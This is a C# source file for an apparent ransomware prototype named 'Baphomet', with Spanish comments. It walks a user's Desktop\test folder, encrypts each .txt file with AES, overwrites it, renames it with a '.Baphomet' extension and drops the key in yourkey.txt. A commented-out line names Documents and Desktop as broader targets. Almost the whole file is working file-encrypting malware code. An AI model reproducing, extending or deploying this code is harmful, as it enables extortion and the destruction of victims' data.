using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program : Decrypt
    {
        static void Main()
        {
            // creo una instancia del algoritmo aes 
            SymmetricAlgorithm aes = new AesManaged();

            byte[] key = aes.Key;

            var userName = Environment.UserName;
            var computerName = System.Environment.MachineName.ToString();
            var  userDir = "C:\\Users\\" +userName;

            directoryRoad(userDir,key);
            decryptConfirm();
        }

        //recoro los directorios
        static void directoryRoad(string userdir, byte[] key)
        {
           // var Dirs = new[] { "\\Documents", "\\Desktop" };
            var extensionCheck = new[] { ".txt" };
            var targetPath = userdir +"\\Desktop\\test";

            string[] files = Directory.GetFiles(targetPath);
            string[] subDirs = Directory.GetDirectories(targetPath);

            for(int i = 0; i < files.Length; i++)
            {
                var extension = Path.GetExtension(files[i]);
                if (extensionCheck.Contains(extension))
                {
                    encryptFileData(files[i], key, targetPath);
                }
            }

        }

        //archivo valido para cifrar bytes
        static void encryptFileData(string file, byte[] key, string targetPath)
        {
            byte[] encryptFileBites = File.ReadAllBytes(file);

            var encryptedBytes = UseAES(encryptFileBites, key);
            File.WriteAllBytes(file, encryptedBytes);
            System.IO.File.Move(file, file + ".Baphomet");

            var saveKey = Convert.ToBase64String(key,0,key.Length);
            File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);

        }


        //Cifro los bytes de el archivo
        static byte[] UseAES(byte[] fileBytes, byte[] key)
        {
            byte[] encryptedBytes = null;

           

            using(MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged myAES = new RijndaelManaged())
                {
                    myAES.BlockSize = 128;
                    myAES.Key = key;
                    myAES.Mode = CipherMode.CBC;

                    using (var cryptStream = new CryptoStream(ms, myAES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptStream.Write(fileBytes, 0, fileBytes.Length);
                        cryptStream.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }

                return encryptedBytes;
            }
        }
    }
}
